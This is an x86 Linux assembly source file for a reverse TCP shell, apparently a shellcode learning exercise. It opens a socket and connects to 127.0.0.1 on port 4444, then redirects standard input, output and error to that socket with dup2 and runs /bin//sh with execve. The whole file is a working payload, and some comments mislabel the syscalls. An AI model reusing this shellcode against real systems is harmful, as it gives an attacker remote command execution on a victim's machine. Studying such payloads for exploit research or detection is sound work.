global _start


section .text

_start:

;sockfd= socket(AF_INET, SOCK_STREAM, 0)
xor eax,eax ;clean eax
mov al,0x66 ;set syscall number to socket
xor ebx,ebx ;zero out ebx
push ebx ;stack protocol=0, default (could be 6 for TCP)
inc ebx ;prepare ebx=1 for stack
push ebx ;stack type=1, sock_stream
push byte 0x2 ;stack domain, af_inet
mov ecx,esp ;store a pointer to the parameters for dup2
int 0x80 ;call the syscall, it returns the socket file descriptor to EAX

mov esi, eax ;store sockfd into ESI

;connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
mov al,0x66 ;set syscall number to socket
pop ebx ;take the 2 from the stack and use as AF_INET

;prepare struct
xor edx,edx ;zero out edx
push 0x0101017f ;set the sin_addr=127.0.0.1
push word 0x5C11 ;set sin_port=4444
push word bx ;sin_family AF_INET	=0x2
inc ebx ;we need 3 in ebx for "connect"
mov ecx, esp ;save pointer
;prepare struct end

push 0x10 ;addrlen=16 structure length
push ecx ; struck sockaddr pointer
push esi ; this is a pointer to the file descriptor sockfd
mov ecx, esp ;pointer to connect() args
int 0x80 ; exec sys bind

;redirect
xchg ebx, esi ;store the socketfd in ebx, and 0x3 in esi. EBX will be the oldfd in DUP2
;pop ecx ; pull the 0x00000000 from the stack
xor ecx,ecx ;zero out ecx
mov cl, 0x2 ; set counter to 2, this will be newfd in DUP2
;loop to call dup2 3 times and duplicate file descriptor for STDIN, STDOUT and STDERR
myloop:
 mov al,0x3F ;dup2 syscall
 int 0x80 ;syscall dup2
 dec ecx ; decrement counter
 jns myloop ; jmp to loop as long as SF is not set to 1


;execve
xor eax,eax
push eax ;push the ending 0x0
push 0x68732f2f ; "hs//" the trick is "//"="/" tom make it four bytes
push 0x6e69622f ; "nib/"
mov ebx, esp ;save the pointer to filename

push eax ; set argument t 0x0
mov ecx, esp ;save the pointer to argument envp

push eax ; set argument t 0x0
mov edx, esp ;save the pointer to argument ptr

mov al,0xb ;call execve
int 0x80 ; execute syscall
